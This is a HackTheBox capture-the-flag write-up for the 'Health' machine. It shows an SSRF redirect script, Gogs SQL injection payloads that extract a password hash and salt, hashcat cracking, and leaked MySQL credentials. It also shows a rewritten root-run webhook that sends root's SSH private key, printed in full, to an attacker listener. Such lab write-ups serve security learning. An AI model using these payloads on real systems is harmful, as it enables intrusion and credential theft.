<!DOCTYPE html>
<html id="doc" class="">
<div id="particles-js">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<!--  Essential META Tags -->
<meta property="og:title" content="Health HackTheBox Writeup">
<meta name="description" content="Health HackTheBox Writeup | 0xv01d">
<meta property="og:type" content="article" />
<meta property="og:image" content="/images/HTB/Health/Health_card.png">
<meta property="og:url" content="https://0xv01d.github.io/hackthebox/Health">
<meta name="twitter:card" content="/images/HTB/Health/Health_card.png">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="/Scripts/js/particles.js"></script>
    <script src="/Scripts/js/app.js"></script>
    <title>Health HackTheBox Writeup | 0xv01d</title>
    <meta property="og:locale" content="en_US">
    <script type="application/ld+json">
    </script>

  <link rel="stylesheet" href="/Styles/style.css?v=">
	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
    <!-- Bootstrap CSS -->
    <!--<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"/>-->
	<link rel="stylesheet" href="/Styles/style_darkwing.css">
	<link rel="stylesheet" href="/Styles/footer.css">
  <script src="/Scripts/js/bar.js"></script>


<!-- Setup Google Analytics -->

	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/health/favicon.ico">

<!--Information Sidebar-->

  </head>
  <body>


        <aside id="menu" class="hide">
            <div class="inner flex-row-vertical">
                <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
                    <i class="icon icon-lg icon-times-circle"></i>
                    <!--        <i class="icon icon-lg icon-close"></i>-->
                </a>
                <div class="brand-wrap avatar-wrapper">
                    <!--    <div class="brand-wrap avatar-wrapper" style="background-image:url(/images/index/avatar.png);"> -->
                    <a href="https:0xv01d.github.io">
                        <img class="avatar shake" src="/images/index/avatar.png">

                    </a>
                    <p></p>
                    <h1 class="tubelight"><strong>0xv01d</strong></h1>
                </div>

                <div class="scroll-wrap flex-col">
                    <ul class="nav">

                        <li class="waves-block waves-effect menu-item">
                            <a href="/">
                                <i class="icon icon-lg icon-home"></i>
                                Home
                            </a>
                        </li>
<!--
                        <li class="waves-block waves-effect menu-item">
                            <a href="#">
                                <i class="icon icon-lg icon-archives"></i>
                                Archives
                            </a>
                        </li>

                        <li class="waves-block waves-effect menu-item">
                            <a href="#">
                                <i class="icon icon-lg icon-tags"></i>
                                Tags
                            </a>
                        </li>
-->
                        <li class="waves-block waves-effect menu-item">
                            <a href="https://github.com/0xv01d" target="_blank">
                                <i class="icon icon-lg icon-github"></i>
                                Github
                            </a>
                        </li>

                        <li class="waves-block waves-effect menu-item">
                            <a href="https://infosec-0xv01d.medium.com/" target="_blank">
                                <i class="icon_new fa-brands fa-medium"></i>
                                <!--                <i class="icon icon-lg icon-medium"></i>-->
                                Medium
                            </a>
                        </li>

                        <li class="waves-block waves-effect menu-item">
                            <a href="https://www.youtube.com/@0xv01d_infosec" target="_blank">
                                <i class="icon_new fa-brands fa-youtube"></i>
                                Youtube
                            </a>
                        </li>
                        
                        <li class="waves-block waves-effect menu-item">
                            <a href="#" target="_blank">
                                <i class="icon_new fa-brands fa-twitch"></i>
                                Twitch
                            </a>
                        </li>

                        <li class="waves-block waves-effect menu-item">
                            <a href="https://www.linkedin.com/in/isaac-david-g-7bb187318?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=android_app" target="_blank">
                                <i class="icon_new fa-brands fa-linkedin"></i>
                                Linkedin
                            </a>
                        </li>

                        <li class="waves-block waves-effect menu-item">
                            <a href="/about">
                                <i class="icon icon-lg icon-link"></i>
                                About
                            </a>
                        </li>
                    </ul>
                    <a style="padding-left: 0.7rem; padding-top: 3rem;"
                        href="https://app.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
                        <img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
                    </a>
                </div>
            </div>
        </aside>
      <main id="main">
<!--        class="app-container"> -->
<div class="fixed-top" id="message"></div>
      <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle" style="padding-right: 0.4rem;">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis" style="visibility: visible;">Health - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="fa-solid fa-language"></i>
<!--                <i class="icon icon-lg icon-language"></i>-->
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>

      </header>
      
<div class="container body-wrap">





<article class="post">		
			<header class="post-header">

<!--Machine Title-->
			<div class="title">Health Walkthrough</div>			
<!--Skill Tags-->								
			<div class="tag-skills">
				<svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
					<title>tag</title>
					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
				</svg>
				<a class="tag" href="#">WebHook</a>
				<a class="tag" href="#">SSRF</a>
				<a class="tag" href="#">SQLI</a>
				<a class="tag" href="#">PBKDF2</a>
				<a class="tag" href="#">Open Redirect</a>
				<a class="tag" href="#">Information Leakage</a>
				<a class="tag" href="#">Cron Jobs</a>
				<a class="tag" href="#">LFI</a>
			</div>

			</header>

<!--Machine Card-->			
			<div><img class="machine-card" style="max-width: 595px;" src="/images/HTB/health/health_card.png"></img></div>
			
<!--Machine Overview-->
			<div class="subtitle">Health Overview</div>
			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Health" rel="noreferrer noopener" target="_blank">Health</a> machine on HackTheBox, submitted by
			<a href="https://app.hackthebox.com/users/476556" rel="noreferrer noopener" target="_blank">irogir</a>. The machine starts with a web server that allows us to create webhooks that we will leverage and redirect the hook to an internal service vulnerable to SQLI, exposing user's credentials and gaining access to the machine.
			After that, we'll discover some root-run cron tabs that bind webhooks and a laravel database whose credentials are leaked in the configuration files, allowing us to read root's id_rsa.
			

<!--Machine Resolution-->
<h1 id="reconnaissance" class="toc-add toc-title">Reconnaissance</h1>
<h2 id="port_scan" class="toc-add">Port-Scan</h2>

              <p class="head-img">As always let's start with a port scan, we only have port 22 and 80 open, also 3000 filtered, this one seems interesting, but there really isn't much, let's take a look at the web</p>
            <img class="img-post" style="max-width: 1262px;" src="/images/HTB/health/nmap.png">

<h2 id="Port 80: WebHook" class="toc-add">Port 80: WebHook</h2>
              <p class="head-img">As we can see it's a page where we can set a webhook, since port 3000 of the machine is filtered, we can write a script to redirect the request to its localhost and see what's in it</p>
            <img class="img-post" style="max-width: 833px;" src="/images/HTB/health/web.png">

<h1 id="foothold" class="toc-add toc-title" style="padding-top: 2.5rem;">Foothold</h1>
<h2 id="SSRF" class="toc-add">Setting Up SSRF with Port 3000</h2>

            <p class="head-img">We are going to set up a listener with netcat that will serve as a hook and where the content of port 3000 will arrive as payload, since we are going to redirect the request to it.</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
#!/usr/bin/ruby
<span class="ld">
<span class="cp">require</span> <span class="k">'webrick'</span>

<span class="cp">class</span> <span class="kt">RedirectServlet</span> <span class="na">< WEBrick::HTTPServlet::AbstractServlet</span>
  <span class="cp">def</span> <span class="ng">do_GET</span>(<span class="ng">request</span>, <span class="ng">response</span>)
    response.status <span class="cp">=</span> <span class="s">302</span>
    response[<span class="k">'Location'</span>] <span class="cp">=</span> <span class="kt">ARGV</span>[<span class="s">0</span>]
  <span class="cp">end</span>
<span class="cp">end</span>

server <span class="cp">=</span> <span class="kt">WEBrick</span>::<span class="kt">HTTPServer</span>.<span class="na">new</span>(<span class="k">:Port</span> => <span class="s">80</span>)
server.mount <span class="k">'/'</span>, <span class="kt">RedirectServlet</span>
<span class="kt">trap</span> <span class="k">'INT'</span> <span class="cp">do</span> server.shutdown <span class="cp">end</span>
server.start</span>
</span> </code></pre></div></div>

            <p class="head-img">Let's leave the script running and netcat listening</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">sudo ruby</span> redirect.rb http://127.0.0.1:3000/
[2022-12-30 16:36:42] INFO  WEBrick 1.6.1
[2022-12-30 16:36:42] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-12-30 16:36:42] INFO  WEBrick::HTTPServer#start: pid=154477 port=80

<span class="na">❯ </span><span class="kt">sudo nc</span> -nlvp 9001 > test
listening on [any] 9001 ...
</span> </code></pre></div></div>

<h3 id="Testing_Webhook" class="toc-add" style="margin-top: 2rem;">Testing the WebHook</h3>
              <p class="head-img">Now we are going to test the webhook</p>
            <img class="img-post" style="max-width: 714px;" src="/images/HTB/health/hook.png">

            <p class="head-img">It should hit our server and we should receive the data via netcat</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">sudo ruby</span> redirect.rb http://127.0.0.1:3000/
[2022-12-30 16:36:42] INFO  WEBrick 1.6.1
[2022-12-30 16:36:42] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-12-30 16:36:42] INFO  WEBrick::HTTPServer#start: pid=154477 port=80
10.10.11.176 - - [30/Dec/2022:16:38:16 EST] "GET / HTTP/1.0" 302 0
- -> /

<span class="na">❯ </span><span class="kt">sudo nc</span> -nlvp 9001 > test
listening on [any] 9001 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.11.176] 55652
</span> </code></pre></div></div>

<h2 id="gogs_enum" class="toc-add">GOGS Enumeration</h2>

              <p class="head-img">Once we format the data, we can see that it's running gogs</p>
            <img class="img-post" style="max-width: 588px;" src="/images/HTB/health/gogs.png">

            <p class="head-img">Searching a bit with searchsploit we find a sqli, and a poc, let's try it making another webhook.</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">searchsploit</span> gogs
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
<span class="gd">Gogs</span> - 'label' SQL Injection                                                                                     | multiple/webapps/35237.txt
<span class="gd">Gogs</span> - 'users'/'repos' '?q' SQL Injection                                                                        | multiple/webapps/35238.txt
----------------------------------------------------------------------------------------------------------------- ---------------------------------

<span class="na">❯ </span><span class="kt">searchsploit</span> gogs -x 35238
<................................>
Proof of Concept                                                                 
================
Request:
http://www.example.com/api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09
(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09
user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)
%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09
as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as
%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09
a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09
JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN
%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN
%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN
%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN
%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN
%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27
<................................>
</span> </code></pre></div></div>

<h2 id="gogs_sqli" class="toc-add">Exploiting Gogs with SQL Injection</h2>
<h3 id="retrieve_user_creds" class="toc-add" style="margin-top: 2rem;">Retrieving User Credentials</h3>

            <p class="head-img">Once we repeat the process we should get more data</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">sudo ruby</span> redirect.rb <span class="k">"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"</span>
[2022-12-30 18:32:04] INFO  WEBrick 1.6.1
[2022-12-30 18:32:04] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-12-30 18:32:04] INFO  WEBrick::HTTPServer#start: pid=224013 port=80
10.10.11.176 - - [30/Dec/2022:18:32:31 EST] "GET / HTTP/1.0" 302 0
- -> /
<span class="na">❯ </span><span class="kt">sudo nc</span> -nlvp 9001 > psswd
listening on [any] 9001 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.11.176] 36982
</span> </code></pre></div></div>

            <p class="head-img">And we get a username and password, let's get the salt</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">cat</span> psswd | <span class="kt">tail</span> -n1 | <span class="kt">jq</span>
{
<..........................................>
  <span class="x">"body"</span>: <span class="na">"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",\"avatar\":\"//1.gravatar.com/avatar/1\"}],\"ok\":true}"</span>,
<..........................................>
}
</span> </code></pre></div></div>

            <p class="head-img">Once we repeat the process again we obtain the salt</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">sudo ruby</span> redirect.rb <span class="k">"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"</span>
[2022-12-30 18:32:04] INFO  WEBrick 1.6.1
[2022-12-30 18:32:04] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-12-30 18:32:04] INFO  WEBrick::HTTPServer#start: pid=224013 port=80
10.10.11.176 - - [30/Dec/2022:18:32:31 EST] "GET / HTTP/1.0" 302 0
- -> /
<span class="na">❯ </span><span class="kt">sudo nc</span> -nlvp 9001 > salt
listening on [any] 9001 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.11.176] 36982

<span class="na">❯ </span><span class="kt">cat </span> salt | <span class="kt">tail</span> -n1 | <span class="kt">jq</span>
<..........................................>
{
  <span class="x">"body"</span>: <span class="na">"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"sO3XIbeW14\",\"avatar\":\"//1.gravatar.com/avatar/1\"}],\"ok\":true}"</span>,
}
<..........................................>
</span> </code></pre></div></div>

<h2 id="crack_hash" class="toc-add">Cracking Password Hashes</h2>
            <p class="head-img">So, since we have the password and salt, let's format it in a <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" rel="nonreferrer noopener" target="_blank">hashcat format</a>, taking a look at the <a href="https://github.com/gogs/gogs" rel="nonreferrer noopener" target="_blank">gogs source code</a> we can see that it's a PBKDF2 hash, also we should convert the salt to base64</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">echo</span> <span class="k">'sha256:10000:'</span><span class="s">$(</span><span class="kt">echo</span> <span class="k">'sO3XIbeW14'</span> | <span class="kt">base64</span> | <span class="kt">head</span> -c 14; <span class="kt">echo</span><span class="s">)</span><span class="k">':'</span><span class="s">$(</span><span class="kt">echo</span> <span class="k">'66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37'</span> | <span class="kt">xxd</span> -r -p | <span class="kt">base64</span><span class="s">)</span>
sha256:1000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
</span> </code></pre></div></div>

            <p class="head-img">Let's crack it</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">hashcat</span> -O -m 10900 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
<...........................................................................>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344395
* Bytes.....: 139921684
* Keyspace..: 14344395

Approaching final keyspace - workload adjusted.  

sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:<span class="gd">february15</span>

Session..........: hashcat
Status...........: Cracked
Hash.Name........: PBKDF2-HMAC-SHA256
Hash.Target......: sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9...9O/jc=
Time.Started.....: Tue Nov  1 22:44:51 2022 (20 secs)
Time.Estimated...: Tue Nov  1 22:45:11 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   790.9 kH/s (0.81ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 14344395/14344395 (100.00%)
Rejected.........: 6538/14344395 (0.05%)
Restore.Point....: 14343560/14344395 (99.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: !!anthony!!

Started: Tue Nov  1 22:44:03 2022
Stopped: Tue Nov  1 22:44:42 2022
</span> </code></pre></div></div>

<h2 id="ssh_access" class="toc-add">SSH Access</h2>

            <p class="head-img">Now we can connect via ssh and read the first flag</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">ssh</span> susanne@10.10.11.176
susanne@10.10.11.176's password: <span class="gd">february15</span>

<span class="kt">susanne@health</span>:~$ cat user.txt 
0c3cbd1c91db1aa4096bb4a60b810b6f
<span class="kt">susanne@health</span>:~$ 
</span> </code></pre></div></div>

              <p class="head-img"></p>
<h1 id="PrivEsc" class="toc-add toc-title">Privilege Escalation</h1>
<h2 id="scheduled_tasks" class="toc-add">Exploring Scheduled Tasks</h2>

            <p class="head-img">Snooping around we find some interesting tasks</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="ld"><span class="kt"></span><span class="x">UID=0    PID=4732   | mysql laravel --execute TRUNCATE tasks 
UID=0    PID=4736   | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
UID=0    PID=4735   | /bin/bash -c sleep 5 && /root/meta/clean.sh 
UID=0    PID=4738   | php artisan schedule:run 
UID=0    PID=4745   | mysql laravel --execute TRUNCATE tasks </span>
</span> </code></pre></div></div>

<h2 id="mysql_creds" class="toc-add">Finding MySQL Credentials</h2>

            <p class="head-img">Also, we can find mysql creds in the web directory</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
            <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="ld"><span class="kt">susanne@health</span>:/var/www/html$ cat ./.env
DB_DATABASE=laravel
DB_USERNAME=<span class="gd">laravel</span>
DB_PASSWORD=<span class="gd">MYsql_strongestpass@2014+</span>
<span class="kt">susanne@health</span>:/var/www/html$
</span> </code></pre></div></div>

<h2 id="webhook_root_id_rsa" class="toc-add">Updating a Webhook to Access Root's id_rsa</h2>
            <p class="head-img">As we saw earlier, the json return refers to the monitored URL, since the cron tabs listed above run as root, if we change it to point to root id_rsa we can gain access to it, we only have to create a webhook and modify it from the DB</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="ld"><span class="kt">susanne@health</span>:/var/www/html/app/Http/Controllers$ cat HealthChecker.php 
<..............................................................................>
    public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {

        $json = [];
        $json['webhookUrl'] = $webhookUrl;
        $json['monitoredUrl'] = $monitoredUrl;

        $res = @file_get_contents($monitoredUrl, false);
<..............................................................................>
</span> </code></pre></div></div>

            <p class="head-img">Set the listener</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">sudo nc</span> -nlvp 80
listening on [any] 80 ...
</span> </code></pre></div></div>

              <p class="head-img">And create the webhook</p>
            <img class="img-post" style="max-width: 840px;" src="/images/HTB/health/webhook.png">

            <p class="head-img">Now let's update the table</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="ld"><span class="kt">susanne@health</span>:~$ mysql -D 'laravel' -u 'laravel' -p
Enter password: <span class="gd">MYsql_strongestpass@2014+</span>

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 400
Server version: 5.7.39-0ubuntu0.18.04.2 (Ubuntu)

mysql> update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
Query OK, 0 rows affected (0.00 sec)
Rows matched: 0  Changed: 0  Warnings: 0

mysql> 
</span> </code></pre></div></div>

<h2 id="obtaining_root_id_rsa" class="toc-add">Obtaining Root Access and Reading the Final Flag</h2>
            <p class="head-img">And in a couple of minutes we get the ssh key</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">sudo nc</span> -lvnp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.176
POST / HTTP/1.1
Host: 10.10.14.10
Accept: */*
Content-type: application/json
Content-Length: 1835
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.14.10\/","monitoredUrl":"file:\/\/\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}
</span> </code></pre></div></div>

            <p class="head-img">Once we format it we can connect and read the final flag</p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight">
          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div> <pre class="highlight"><code>
<span class="na">❯ </span><span class="ld"><span class="kt">cat</span> id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
